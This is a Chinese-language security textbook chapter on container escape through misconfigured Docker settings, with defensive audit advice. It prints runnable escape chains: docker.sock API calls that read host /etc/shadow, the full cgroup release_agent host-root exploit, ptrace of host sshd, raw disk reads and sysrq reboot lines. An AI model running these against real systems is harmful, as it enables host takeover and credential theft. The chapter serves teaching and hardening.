# Ch 17 — 容器逃逸（一）：配置類攻擊

> **目標**：理解配置錯誤如何讓容器邊界形同虛設；掌握 `--privileged`、危險 capability（能力，Linux capability）、危險掛載、`docker.sock` 等配置類逃逸的原理與利用鏈，並能在真實環境識別與防禦這些向量。
>
> **環境**：Docker 27.x、Linux kernel 6.6+（Ubuntu 24.04 或同等環境）；標記 **本段未實測，為理論預期行為** 的片段需要隔離 VM 驗證。

---

## 為什麼需要這章

Ch16 解釋了 namespace + cgroup + seccomp 如何疊起來形成容器邊界。理論上這條防線很扎實——但它有個致命弱點：**每一層都可以被管理員手動拆掉**，而且拆的方式往往只是在 `docker run` 加一個 flag，或在 Compose YAML 裡多寫一行。

從攻擊者視角，配置類逃逸比 kernel exploit 容易太多。CVE 型漏洞需要等 1-day 或自己找；配置類逃逸只需要對方的 DevOps 同事在趕 deadline 時複製貼上了一份 Stack Overflow 的範例。在紅隊評估中，配置類逃逸的成功率遠高於漏洞類，因為它不依賴 kernel 版本，只依賴人類偷懶的習慣。

本章覆蓋的所有向量在 CTF、紅隊和真實雲環境滲透測試裡都已被大量復現，屬於每個 container security 工程師必須爛熟於心的基礎。

---

## 先建直覺

把容器想成一個保險箱，namespace 是它的鎖，capability 是鑰匙的形狀，seccomp 是鎖孔的過濾網。

`--privileged` 等於把所有鎖全部拆掉、交出所有形狀的鑰匙、然後把過濾網也一起移除。`docker.sock` 掛載等於把保險箱的遙控器放進去——裡面的人可以用遙控器叫人在外面再開一個沒有鎖的保險箱。

以下是常見配置類逃逸的完整攻擊鏈視圖：

```
Host Kernel (Linux 6.6)
│
├─ Normal Container (secure defaults)
│   ├─ ~14 capabilities only
│   ├─ seccomp filter active (44 syscalls blocked)
│   ├─ restricted /dev (no raw disks)
│   └─ isolated mount/pid/net namespace  ──► cannot escape
│
├─ --privileged Container
│   ├─ ALL 41 capabilities granted
│   ├─ seccomp = unconfined
│   ├─ full /dev access (includes /dev/sda, /dev/mem)
│   └─ host cgroups visible
│       └──► cgroup release_agent write ──► host RCE (Felix Wilhelm 2019)
│
├─ docker.sock mounted Container
│   ├─ Docker API fully accessible via curl
│   ├─ can enumerate images/containers
│   ├─ can create new containers with arbitrary config
│   └──► create --privileged + -v /:/host container
│           └──► read/write entire host filesystem
│
├─ CAP_SYS_PTRACE + hostPID Container
│   ├─ sees all host PIDs (ps aux shows host processes)
│   └──► gdb/ptrace any host process
│           └──► inject shellcode into sshd/nginx/etc
│
├─ CAP_SYS_MODULE Container
│   └──► insmod malicious.ko ──► kernel rootkit loaded
│
└─ Dangerous Volume Mounts
    ├─ -v /:/host        ──► read/write entire host FS
    ├─ -v /proc:/proc    ──► host process manipulation
    └─ -v /dev:/dev      ──► dd if=/dev/sda (raw disk read)
```

記住這張圖的結構：每一個攻擊向量都是在拆除 Ch16 描述的某一層防護，然後跨越到 host 的某個資源。

---

## 底層機制

### --privileged 到底開了什麼

`--privileged` 是一個複合開關，同時做三件事：

**1. 授予所有 capability**

正常容器只有約 14 個預設 capability（`CAP_NET_BIND_SERVICE`、`CAP_CHOWN` 等），這個清單在 Docker 的 `oci/defaults.go` 裡定義。`--privileged` 會把 Linux 定義的全部 41 個 capability 一次給完，包含最危險的 `CAP_SYS_ADMIN`、`CAP_SYS_MODULE`、`CAP_SYS_PTRACE`。

**2. 停用 seccomp profile**

Docker 預設有一份 seccomp 白名單，封鎖了 `mount`、帶特定 flag 的 `clone`、`perf_event_open`、`open_by_handle_at` 等約 44 個 syscall。`--privileged` 把這份 profile 設為 `unconfined`，kernel 不再過濾任何 syscall。

這個細節很重要：即使容器有 `CAP_SYS_ADMIN`，如果 seccomp 還在，`mount` syscall 仍然會被阻擋。`--privileged` 必須同時拆掉兩道防線。

**3. 開放所有裝置節點（device node）**

正常容器的 `/dev` 是受限的 devtmpfs，只有有限的裝置節點（`/dev/null`、`/dev/random`、`/dev/tty` 等）。`--privileged` 把 host 的完整 `/dev` 掛進來，包含 `/dev/sda`（原始磁碟）、`/dev/mem`（實體記憶體的直接映射）、`/dev/kmem`（kernel 虛擬記憶體）等。

### Capability 的運作模型

每個 process 有五個 capability 集合：
- `Permitted`：process 可以擁有的上限
- `Effective`：目前生效的（kernel 實際檢查這個）
- `Inheritable`：`execve` 時可以傳遞給子 process 的
- `Bounding`：capability 的硬上限，`Permitted` 不能超過這個
- `Ambient`：非特權 process 的 `execve` 傳遞機制（Linux 4.3 新增）

`capsh --print` 讓我們看到這些集合。當一個 syscall 需要某個 capability 時，kernel 檢查 `Effective` 集合。`--cap-add` 和 `--cap-drop` 讓我們精確控制 `Permitted`/`Effective`/`Bounding` 集合，而不需要開整個 `--privileged`。

### 危險 Capability 逐項分析

**CAP_SYS_ADMIN**：這是最危險的單一 capability，授權的操作包含：
- `mount`/`umount2`（掛載任意檔案系統）
- `pivot_root`（切換 root 目錄）
- `clone` 的 namespace 相關 flags（建立新 namespace）
- `setns`/`unshare`（操作 namespace）
- `ioctl` 的大量裝置控制操作
- `keyctl`（操作 kernel keyring，可以讀取其他 process 的 key）
- `perf_event_open`（效能計數器，可以當 keylogger 用）
- cgroup 相關操作

單獨一個 `CAP_SYS_ADMIN` 在正確的環境下就足以逃逸。

**CAP_SYS_PTRACE**：允許 `ptrace` 任意 process。在容器內單獨使用只能 ptrace 同一 PID namespace 的 process（即同容器的 process）。但搭配 `--pid=host` 後，可以 ptrace host 上的任意 process，包含 sshd、nginx、資料庫等，實現記憶體讀取和 shellcode 注入。

**CAP_DAC_READ_SEARCH**：`DAC`（Discretionary Access Control）即 Unix 的 rwx 權限檢查。這個 capability 讓 process 繞過「讀取」和「搜尋目錄」的 DAC 檢查——不管檔案是 `chmod 000` 還是其他用戶擁有，都能讀取。在 host bind mount 的路徑上，可以讀取 `/etc/shadow`、SSH private key 等敏感檔案。另外它也啟用 `open_by_handle_at` syscall，這是 shocker.c（2014 年）利用的關鍵 syscall。

**CAP_NET_ADMIN**：允許設定網路介面、修改路由表、啟用混雜模式（promiscuous mode）嗅探流量、設定 iptables 規則、建立 tunnel（如 TUN/TAP）。在 `--network=host` 容器中，可以嗅探整個 host 的網路流量。

**CAP_SYS_MODULE**：允許 `init_module`/`finit_module` 載入 kernel module 和 `delete_module` 卸載它。這是最直接的 kernel 控制方式——直接寫一個 `.ko`，裡面呼叫 `call_usermodehelper()` 在 host namespace 執行任意指令，然後 `insmod` 它。

---

## 具體示範

### 示範 1：capsh 對比 --privileged 前後

**正常容器的 capability：**

```bash
docker run --rm alpine sh -c "apk add -q libcap && capsh --print"
```

預期輸出（節錄）：

```
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,
cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,
cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,
cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,
cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
uid=0(root)
gid=0(root)
groups=0(root),1(bin),2(daemon),...
```

**--privileged 容器的 capability：**

```bash
docker run --rm --privileged alpine sh -c "apk add -q libcap && capsh --print"
```

預期輸出（節錄）：

```
Current: =ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,
cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,
cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap,cap_sys_admin,
cap_sys_module,cap_sys_rawio,cap_sys_ptrace,...（全部 41 項）
Securebits: 00/0x0/1'b0
```

`=ep` 表示 Effective 和 Permitted 集合包含所有 capability，`e` 是 effective，`p` 是 permitted。這是 capability 表示法的最高狀態。

**驗證 seccomp 狀態差異：**

```bash
# 正常容器：mount 被 seccomp 封鎖（即使是 root）
docker run --rm alpine mount -t tmpfs tmpfs /mnt
# 預期輸出: mount: permission denied (are you root?)
# 原因：seccomp 過濾了 mount syscall，errno=EPERM

# --privileged 容器：mount 成功執行
docker run --rm --privileged alpine sh -c "mount -t tmpfs tmpfs /mnt && echo 'mount succeeded'"
# 預期輸出: mount succeeded
```

**確認裝置差異：**

```bash
# 正常容器：/dev 是受限的
docker run --rm alpine ls /dev
# 預期輸出: console  core  fd  full  null  ptmx  pts  random  shm  stderr  stdin  stdout  tty  urandom  zero

# --privileged 容器：/dev 包含原始磁碟裝置
docker run --rm --privileged alpine ls /dev | grep -E "sd|nvme|loop"
# 預期輸出: loop0  loop1  ...  sda  sda1  sda2  ...（host 上的磁碟）
```

### 示範 2：docker.sock 逃逸鏈

這是實戰中最常見的逃逸向量之一。當應用程式需要控制 Docker（如 CI runner、container 管理工具）時，管理員往往把 `docker.sock` 掛進去。進入這類容器後，攻擊面立刻展開。

假設我們已進入一個掛載了 `docker.sock` 的容器：

```bash
# 確認 docker.sock 存在且可存取
ls -la /var/run/docker.sock
# 預期輸出: srw-rw---- 1 root docker 0 Aug  1 00:00 /var/run/docker.sock

# 確認我們能打通 Docker daemon
curl --unix-socket /var/run/docker.sock http://localhost/v1.41/version
# 預期輸出: {"Platform":{"Name":"Docker Engine - Community"},"Version":"27.x.x",...}
```

**Step 1：枚舉 images（可實測，無副作用）**

```bash
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/v1.41/images/json \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
for img in data:
    print(img.get('RepoTags', ['<none>']))
"
```

預期輸出：

```
['ubuntu:latest']
['alpine:3.19']
['nginx:1.25']
```

**Step 2：枚舉正在運行的容器（可實測，無副作用）**

```bash
curl -s --unix-socket /var/run/docker.sock \
  "http://localhost/v1.41/containers/json" \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
for c in data:
    print(c['Id'][:12], c['Names'], c['Image'])
"
```

**Step 3：建立特權容器讀取 host /etc/shadow**

**本段未實測，為理論預期行為**。以下完整逃逸流程需要在完全隔離的 VM 上執行。不能在共用開發環境或 CI 系統上執行，否則會影響 host 系統。

驗證方式：在一台只做測試用途的 VM 上啟動一個掛載 docker.sock 的 Ubuntu 容器（`docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash`），然後在容器內執行以下步驟，確認能讀到 host 的 `/etc/shadow`。

```bash
# Step 3a: 建立特權容器，掛載 host 根目錄到 /host
CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  http://localhost/v1.41/containers/create \
  -d '{
    "Image": "ubuntu:latest",
    "Cmd": ["cat", "/host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host:ro"],
      "Privileged": true
    }
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['Id'])")

echo "Created container: $CONTAINER_ID"

# Step 3b: 啟動容器
curl -s --unix-socket /var/run/docker.sock \
  -X POST \
  "http://localhost/v1.41/containers/${CONTAINER_ID}/start"

# Step 3c: 等待容器結束（Cmd 執行完自動退出）
sleep 1

# Step 3d: 取得 stdout 輸出
curl -s --unix-socket /var/run/docker.sock \
  "http://localhost/v1.41/containers/${CONTAINER_ID}/logs?stdout=1&stderr=0" \
  | strings  # Docker log 有 8-byte header，strings 過濾掉控制字元
```

預期行為：輸出 host 的 `/etc/shadow` 內容，例如：

```
root:$6$xxxx...:19000:0:99999:7:::
daemon:*:18858:0:99999:7:::
...
```

這代表完全的 host 敏感檔案讀取，逃逸完成。

### 示範 3：CAP_DAC_READ_SEARCH 與 namespace 邊界（失敗案例說明）

這個示範說明為什麼單獨的 `CAP_DAC_READ_SEARCH` 不直接讓你讀到 host 的 `/etc/shadow`，以及什麼樣的組合才構成完整的威脅。

```bash
# 容器有 CAP_DAC_READ_SEARCH，但沒有 host 路徑掛載
docker run --rm --cap-add DAC_READ_SEARCH ubuntu:latest \
  cat /etc/shadow
```

預期輸出：

```
root:!:19000:0:99999:7:::
daemon:*:18858:0:99999:7:::
...
```

注意：讀到的是**容器自己的** `/etc/shadow`（通常是從 image 來的預設內容或空密碼），不是 host 的。`CAP_DAC_READ_SEARCH` 繞過的是 DAC 的 rwx 權限位元，但 mount namespace 隔離仍然有效——容器的根目錄掛載點和 host 是完全分開的。

**加上 host bind mount 後，情況完全不同：**

```bash
# 掛載 host /etc 到容器的 /host-etc，然後用 CAP_DAC_READ_SEARCH 讀取
docker run --rm --cap-add DAC_READ_SEARCH \
  -v /etc:/host-etc:ro \
  ubuntu:latest \
  cat /host-etc/shadow
```

預期輸出：host 的真實 `/etc/shadow`。

這個「失敗後成功」案例的教學意義：**單一錯誤配置的危害取決於與其他配置的組合**。審計時不能孤立地評估每個 flag，必須看完整的 `docker run` 或 compose 配置的交叉效果。

---

## cgroup release_agent 逃逸（Felix Wilhelm 技術）

2019 年 Felix Wilhelm 在 Twitter 公開了一個利用 cgroup v1 `release_agent` 機制的逃逸技術。這個技術的精妙之處在於完全不需要 kernel 漏洞，只利用 `--privileged` 所開放的正常 Linux 功能。

**原理**：cgroup v1 有一個 `notify_on_release` 功能——當一個 cgroup 中的最後一個 process 離開時，kernel 會在 **host mount namespace** 中執行 `release_agent` 指定的程式。這個「在 host mount namespace 執行」是關鍵：從容器內設定 `release_agent` 並觸發它，就等於在 host 上拿到任意指令執行。

**本段未實測，為理論預期行為**。完整的逃逸需要以下條件：
1. `--privileged` 容器（需要 `CAP_SYS_ADMIN` 和 seccomp off 才能 `mount`）
2. host 上 cgroup v1 啟用（用 `cat /proc/filesystems | grep cgroup` 確認）
3. cgroup v1 memory hierarchy 可掛載

驗證方式：在隔離 VM 上建立 `--privileged` 的 Ubuntu 容器，執行以下步驟，確認 host 上出現 `/tmp/escape_proof` 檔案，並且其中是 `root` 的 `id` 輸出。

```bash
# 以下全部在 --privileged 容器內執行

# Step 1: 掛載 host cgroup v1 的 memory hierarchy
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
# 確認掛載成功
ls /tmp/cgrp/
# 預期看到: cgroup.clone_children  cgroup.procs  memory.limit_in_bytes ...

# Step 2: 建立一個子 cgroup（任意名稱）
mkdir /tmp/cgrp/exploit

# Step 3: 啟用 notify_on_release
# 1 表示「當這個 cgroup 變空時呼叫 release_agent」
echo 1 > /tmp/cgrp/exploit/notify_on_release

# Step 4: 找容器在 host 上的 overlay upperdir 路徑
# /proc/mounts 裡記錄了 overlay 的 upperdir，這是容器可寫層在 host 上的路徑
# 我們利用這個路徑讓 release_agent 能找到我們放的 script
HOST_PATH=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts | head -1)
echo "Container upperdir on host: $HOST_PATH"
# 預期輸出: /var/lib/docker/overlay2/<hash>/diff

# Step 5: 在容器 FS 上寫一個 shell script（透過 overlay 會對應到 host 路徑）
cat > /cmd << 'SCRIPT'
#!/bin/sh
# This executes in HOST mount namespace as root
id > /tmp/escape_proof
hostname >> /tmp/escape_proof
SCRIPT
chmod +x /cmd

# Step 6: 把 release_agent 指向 host 上的這個 script
# 使用 HOST_PATH 拼出 host 上的完整路徑
echo "${HOST_PATH}/cmd" > /tmp/cgrp/release_agent

# Step 7: 在子 cgroup 中放一個 process 然後殺掉，觸發 release_agent
# sh -c 在子 cgroup 中啟動，echo $$ 把自己的 PID 寫入 cgroup.procs
# sleep 時間到後 sh 退出，cgroup 變空，release_agent 在 host namespace 觸發
sh -c "echo \$\$ > /tmp/cgrp/exploit/cgroup.procs && sleep 0.5"

# Step 8: 等待 release_agent 執行
sleep 1

# Step 9: 驗證（在容器內，但 /tmp/escape_proof 是在 host /tmp 上建立的）
cat /tmp/escape_proof
# 如果逃逸成功，在 host 上也會看到 /tmp/escape_proof
# 預期輸出: uid=0(root) gid=0(root) groups=0(root)  ← 這是 HOST 的 root
#           <hostname>  ← 這是 HOST 的 hostname，不是容器的
```

**為什麼 Step 4 需要 upperdir？**

`release_agent` 的路徑是從 host 的 mount namespace 解析的，而不是容器的。如果我們直接寫 `/cmd`，host 會去找 host root 的 `/cmd`，那個路徑不存在（host 上沒有這個 script）。通過讀 `/proc/mounts` 找到 overlay upperdir，我們知道容器內的 `/cmd` 在 host 上對應的真實路徑，讓 host kernel 能找到那個 script 並執行。

**cgroup v2 的情況**：cgroup v2 沒有 `release_agent` 機制，這個技術在純 cgroup v2 環境（`/sys/fs/cgroup/cgroup.controllers` 存在）上無效。但 hybrid mode（同時掛載 v1 和 v2）仍然可能受影響，需要確認 `/proc/filesystems` 裡是否還有 `cgroup`（v1）。

---

## 對比取捨表

| 配置 | 開放的邊界 | 最小化替代方案 | 逃逸難度 | 需要組合 |
|------|-----------|---------------|---------|---------|
| `--privileged` | 全部 capability + seccomp off + 全 /dev | 精確 `--cap-add` + seccomp profile | 極低（直接利用） | 單獨即可 |
| `-v /var/run/docker.sock` | Docker API 完整存取 | Docker-in-Docker 或 rootless Docker | 低（curl 即可） | 單獨即可 |
| `-v /:/host` | Host 完整 FS 讀寫 | 精確 bind mount，加 `:ro` | 低（直接讀寫） | 單獨即可 |
| `--pid=host` | 看到所有 host process | 不開；debug 用 nsenter | 中（需搭配） | 需 SYS_PTRACE |
| `--network=host` | Host network stack 完整存取 | 建立專用 bridge network | 低（直接嗅探） | CAP_NET_RAW（預設有） |
| `CAP_SYS_MODULE` | 載入任意 kernel module | 不給；用 eBPF 替代 | 極低（insmod 即可） | 單獨即可 |
| `CAP_SYS_PTRACE` | ptrace 同 PID namespace process | 不給 | 中（有限制） | 搭配 --pid=host 才危險 |
| `CAP_DAC_READ_SEARCH` | 繞過 DAC 讀取任意檔案 | 不給；用正確 UID 設定 | 中（有限制） | 需搭配 host bind mount |
| `CAP_SYS_ADMIN` | 掛載、namespace 操作、keyring 等 | 不給；非常少數情況才需要 | 低到中 | 單獨已很危險 |

---

## 危險掛載詳解

在 `--privileged` 和 capability 之外，bind mount 配置錯誤是另一個獨立的逃逸向量，不需要任何特殊 capability 就能造成嚴重損害。

### -v /proc:/proc（或 --pid=host 的副作用）

`/proc` 是 kernel 暴露 process 資訊和系統狀態的偽檔案系統（pseudo-filesystem）。把 host 的 `/proc` 掛進容器，等於讓容器能直接操作 host 的 kernel 參數和 process 狀態。

```bash
# 掛載 host /proc 的容器內可以看到 host 上的所有 process
docker run --rm -v /proc:/host-proc ubuntu:latest \
  ls /host-proc/ | head -20
# 預期輸出: 1  2  3  ...（host 上所有 process 的 PID 目錄）

# 還可以讀取 host kernel 參數
docker run --rm -v /proc:/host-proc ubuntu:latest \
  cat /host-proc/sys/kernel/hostname
# 預期輸出: host 的 hostname，不是容器的
```

更危險的是 `/proc/sysrq-trigger`：

**本段未實測，為理論預期行為**。在隔離 VM 上確認以下行為：

```bash
# 在掛載了 host /proc 的容器內
# echo 'b' > /host-proc/sysrq-trigger  ← 立即重啟 host（不要實際執行）
# echo 'c' > /host-proc/sysrq-trigger  ← 觸發 kernel crash dump（不要實際執行）

# 確認 sysrq 是否啟用
cat /host-proc/sys/kernel/sysrq
# 輸出: 438 表示幾乎所有 sysrq 功能都啟用
```

### -v /dev:/dev（原始磁碟存取）

把 host 的 `/dev` 掛入容器，讓攻擊者可以直接讀取原始磁碟裝置，繞過所有 OS 層的存取控制：

```bash
# 找到 host 的系統磁碟（在有 -v /dev:/dev 的容器內）
docker run --rm -v /dev:/host-dev ubuntu:latest \
  ls /host-dev/sd* /host-dev/nvme* 2>/dev/null
# 預期輸出: /host-dev/sda  /host-dev/sda1  /host-dev/sda2

# 直接讀取磁碟的前 512 bytes（MBR/GPT header）
docker run --rm -v /dev:/host-dev ubuntu:latest \
  dd if=/host-dev/sda bs=512 count=1 2>/dev/null | strings | head -5
# 預期輸出: 磁碟分割表資訊和 GRUB bootloader 字串
```

有了原始磁碟存取，攻擊者可以：用 `debugfs` 直接讀取 ext4 分割區的任意檔案（繞過 OS 的權限管理）、用 `testdisk` 恢復已刪除的 log 檔案、或者直接把整個磁碟 dump 出來進行離線分析。

---

## hostPID 與 hostNetwork 詳解

### --pid=host

`--pid=host` 讓容器和 host 共用 PID namespace。結果是容器內的 process 可以看到所有 host process 的 PID，`ps aux` 會列出 host 上的所有 process。

```bash
# 在 --pid=host 容器內
docker run --rm --pid=host ubuntu:latest ps aux | wc -l
# 預期輸出: 遠大於容器內啟動的 process 數量，因為看到了 host 所有 process

docker run --rm --pid=host ubuntu:latest ps aux | grep sshd
# 預期輸出: 看到 host 上的 sshd process 及其 PID
```

單獨的 `--pid=host` 危害有限（只能「看」，不能干預）。但加上 `CAP_SYS_PTRACE`：

**本段未實測，為理論預期行為**。在隔離 VM 上，啟動一個 `--pid=host --cap-add SYS_PTRACE` 的容器，嘗試用 `gdb` 附著到 host 的 `sshd` process，確認能讀取其記憶體空間。

```bash
docker run --rm --pid=host --cap-add SYS_PTRACE ubuntu:latest bash << 'EOF'
apt-get install -qq gdb

# 找 sshd 的 PID
SSHD_PID=$(pgrep -x sshd | head -1)
echo "Found sshd at PID: $SSHD_PID"

# 附著到 sshd，讀取它的 stack pointer 附近的記憶體
# 這在 host namespace 的 sshd process 上執行，可以讀取其記憶體，注入 shellcode
gdb -p "$SSHD_PID" -batch \
  -ex "x/20gx \$rsp" \
  -ex "info proc mappings" \
  2>/dev/null | head -30
EOF
```

### --network=host

`--network=host` 完全移除容器的 network namespace，讓容器直接共用 host 的 network stack。

```bash
# 正常容器：只看到 veth 和 lo
docker run --rm ubuntu:latest ip addr show | grep -E "^[0-9]+:"
# 預期輸出:
# 1: lo: ...
# 51: eth0@if52: ...  (veth pair 的容器端)

# --network=host 容器：看到 host 所有 interface
docker run --rm --network=host ubuntu:latest ip addr show | grep -E "^[0-9]+:"
# 預期輸出:
# 1: lo: ...
# 2: eth0: ...     (host 的真實 interface)
# 3: docker0: ...  (Docker 的 bridge)
# ...
```

`--network=host` 加上預設就有的 `CAP_NET_RAW`，可以直接嗅探 host 的所有網路流量：

```bash
docker run --rm --network=host ubuntu:latest bash -c "
  apt-get install -qq tcpdump
  tcpdump -i eth0 -c 20 -nn 'not port 22'
"
# 預期行為：能嗅探到 host eth0 上的所有非 SSH 流量
```

還可以直接 bind 到 host 的 80 port 或其他已知服務端口，干擾 host 上的服務。

---

## 踩雷集錦

**1. 以為「唯讀掛載」就安全**

`-v /:/host:ro` 讓 host 根目錄以唯讀方式掛進容器。「唯讀」只防止直接修改，攻擊者仍能讀取所有 host 檔案：`/etc/shadow`、`/root/.ssh/id_rsa`、`~/.aws/credentials`、應用程式的環境設定檔，全部都拿得到。把 host 根目錄以唯讀方式掛進去，等於讓攻擊者做了完整的 host 資料外洩。

**2. CAP_SYS_ADMIN 的範圍遠超「系統管理」字面意義**

很多人以為 `CAP_SYS_ADMIN` 只授權「一般的系統管理操作」。實際上 Linux man page 對 `CAP_SYS_ADMIN` 的描述長達數頁，授權的 syscall 超過 40 個，包含 `mount`、`pivot_root`、`clone` 的 namespace flags、`setns`、`keyctl`、`perf_event_open`、`ioctl(TIOCSTI)` 等。這個 capability 太廣，Linux 社群長期討論要把它拆分，但向下相容的壓力讓這件事很難推進。在任何容器配置中看到 `CAP_SYS_ADMIN` 都要把它當成準 `--privileged` 對待。

**3. docker.sock 的存取控制被大幅低估**

Docker socket 的 Unix 權限是 `0660 root:docker`，任何在 `docker` group 的用戶都能直接控制 Docker daemon。在容器內掛載 docker.sock 之後，容器內任何以任意 UID 運行的 process 都能呼叫 Docker API——不管容器配置了什麼 user namespace 或是以非 root 用戶運行。這不是「可以建新容器」，而是「等同於宿主機上的 root 權限」。任何需要容器管理能力的應用，都應該優先考慮 Docker-in-Docker（DinD）或 rootless Docker，而不是掛 docker.sock。

**4. Compose 裡的 `privileged: true` 當作 debug 快速解法留在 production**

開發者在本地 debug 時加了 `privileged: true` 解決某個奇怪的 mount 失敗，把問題推後了，compose 檔就直接提交進 repo 然後部署到 production。這種情境在紅隊評估和 audit 中非常常見。審計 compose 檔時，`privileged: true`、`security_opt: - no-new-privileges:false`、`cap_add: - SYS_ADMIN`，這三個都要自動標記為高風險。

**5. 以為升到 cgroup v2 就封死了 release_agent 技術**

很多人以為升到 cgroup v2 就完全免疫 Felix Wilhelm 的技術。但很多發行版（包含 Ubuntu 22.04）在過渡期同時掛載 v1 和 v2（hybrid mode），容器內仍然可能找到 v1 cgroup hierarchy。正確的確認方式是在 host 上執行 `stat -fc %T /sys/fs/cgroup`——如果輸出是 `cgroup2fs`，是純 v2；如果是 `tmpfs`，可能是 v1 或 hybrid。純 v2 才能排除 release_agent 技術。

---

## 進階延伸

**shocker.c（2014 年的先驅）**：Sebastian Krahmer 的 shocker.c 用 `CAP_DAC_READ_SEARCH` 加上 `open_by_handle_at` syscall，在早期 Docker 版本實現了 host 根目錄的任意讀取。它掃描 host FS 的 inode 空間，找到目標檔案的 file handle，然後用 `open_by_handle_at` 繞過 chroot 邊界直接打開它。Docker 後來把 `open_by_handle_at` 加入預設 seccomp 黑名單才緩解這個問題，完美說明 seccomp 和 capability 必須同時設定才有效。

**Linux Capabilities 完整清單與新增項目**：`man 7 capabilities` 是審計 Dockerfile 和 Kubernetes `securityContext` 的第一手資料。特別注意兩個相對新的 capability：`CAP_CHECKPOINT_RESTORE`（Linux 5.9 新增，允許 dump/restore process 狀態，含記憶體映像）和 `CAP_PERFMON`（從 `CAP_SYS_ADMIN` 拆分出來的 perf 相關能力，但仍可以讀取其他 process 的 perf 資料）。這兩個新 capability 往往被安全審計工具遺漏。

**Kubernetes 的對應配置**：本章的每個 Docker flag 在 Kubernetes 裡都有對應的 `securityContext` 欄位。`--privileged` 對應 `securityContext.privileged: true`，capability 對應 `securityContext.capabilities.add`，`--pid=host` 對應 `spec.hostPID: true`，`--network=host` 對應 `spec.hostNetwork: true`。Kubernetes 的 Pod Security Standards（PSS）的 Restricted profile 禁止了幾乎所有本章描述的配置，理解 Docker 層的行為是理解為什麼 PSS 要這樣設計的基礎。

**偵測工具**：Trivy 可以在 CI 階段掃描 Dockerfile 和 compose 檔，標記危險配置（`trivy config docker-compose.yml`）。Falco 在 runtime 監控 syscall，`--privileged` 容器的行為模式（大量 `mount`、`mknod` 操作）會觸發預設規則。Ch23 會深入 Falco 規則撰寫；Ch34 會把這些偵測整合進完整的 supply chain 防護架構。

---

## 本章重點整理

- `--privileged` 是三合一：全部 41 個 capability + seccomp unconfined + 完整 /dev，等同於直接給 host root 存取
- 最危險的單一 capability 是 `CAP_SYS_ADMIN`，授權操作超過 40 個 syscall，遠超字面上「系統管理」的範圍
- `CAP_DAC_READ_SEARCH` 本身繞過 DAC 權限，但 mount namespace 仍然隔離；要配合 host bind mount 才能讀到 host 上的敏感檔案
- `CAP_SYS_MODULE` 讓攻擊者直接 `insmod` rootkit，是最直接的 kernel 控制方式
- `docker.sock` 掛載等於授予 Docker daemon 完整控制權，可以用純 curl 命令建立特權容器並讀取 host 任意檔案
- cgroup v1 的 `release_agent` 允許 `--privileged` 容器在 host mount namespace 執行任意指令（Felix Wilhelm 2019）
- `--pid=host` 加 `CAP_SYS_PTRACE` 可以 ptrace host 上任意 process，實現記憶體讀取和 shellcode 注入
- 配置錯誤的危害往往取決於組合，不能孤立評估每個 flag；審計要看完整的 `docker run` 或 compose 配置

---

## 自我檢核

1. 執行 `docker run --privileged alpine capsh --print` 和 `docker run alpine capsh --print`（先裝 libcap），找出 capability 差異，解釋 `=ep` 在 capability 表示法裡代表什麼，以及為什麼這是最高權限狀態。

2. 在一個掛載了 `docker.sock` 的容器裡，用 `curl --unix-socket` 列出所有正在運行的容器。說明這個操作等同於 host root 的理由是什麼，不是因為「curl 很強大」，而是因為 Docker API 本身不做額外的授權檢查。

3. 說明 `CAP_SYS_ADMIN` 為什麼在 `--privileged` 的所有 capability 中最危險。列舉至少 5 個它授權的不同 syscall 或操作，並說明每個操作在逃逸情境下的用途。

4. Felix Wilhelm 的 cgroup release_agent 技術中，Step 4（找 overlay upperdir）的作用是什麼？如果跳過這步，直接把 `release_agent` 設成 `/cmd`，會發生什麼事？為什麼？

5. 一個容器配置了 `--cap-add SYS_PTRACE --pid=host`，但沒有 `--privileged` 和其他任何 cap-add。攻擊者能做什麼？有哪些限制阻止了更進一步的攻擊？

---

## 延伸閱讀

1. **Felix Wilhelm, cgroup release_agent 逃逸原始 tweet thread（2019）** — 搜尋 `"felix wilhelm" "docker escape" "release_agent"` 可找到原始討論串及多個後續 write-up，包含 Trail of Bits 和 Bishop Fox 的深度分析文章，是理解這個技術機制的第一手資料。

2. **man 7 capabilities（線上版）** — https://man7.org/linux/man-pages/man7/capabilities.7.html — Linux 對每個 capability 的精確定義，包含每個 capability 授權的完整 syscall 和操作清單。審計 securityContext 的必備參考，不能只靠 capability 名稱猜測範圍。

3. **Docker Security Documentation** — https://docs.docker.com/engine/security/ — 涵蓋 AppArmor profile、seccomp 預設黑名單（包含完整 44 個被封鎖的 syscall 清單）、rootless mode 和 user namespace 的官方說明。

4. **HackTricks: Docker Security / Container Escape** — https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security — 攻擊者視角的系統整理，涵蓋本章所有向量加上更多 edge case（`/proc/sysrq-trigger`、`/dev/mem` 直接讀取、namespace fd 利用），適合快速複習完整的配置類逃逸清單。

5. **NCC Group: Understanding and Hardening Linux Containers（2016）** — https://research.nccgroup.com/2016/05/19/understanding-and-hardening-linux-containers/ — 對 namespace/capability/seccomp 三層模型最清晰的學術性參考，雖然發表於 2016 年，基礎原理至今不變，是理解為什麼每一層防護存在的最佳背景材料。

---

Ch17 把配置類逃逸的主要向量全部鋪開——從最粗暴的 `--privileged` 到需要理解 cgroup 內部機制的 release_agent 技術。下一章進入需要 kernel 漏洞或更複雜利用鏈的逃逸場景，難度提升但概念建立在本章之上。

→ [Ch18 — 容器逃逸（二）：漏洞類](18-container-escape-2.md)
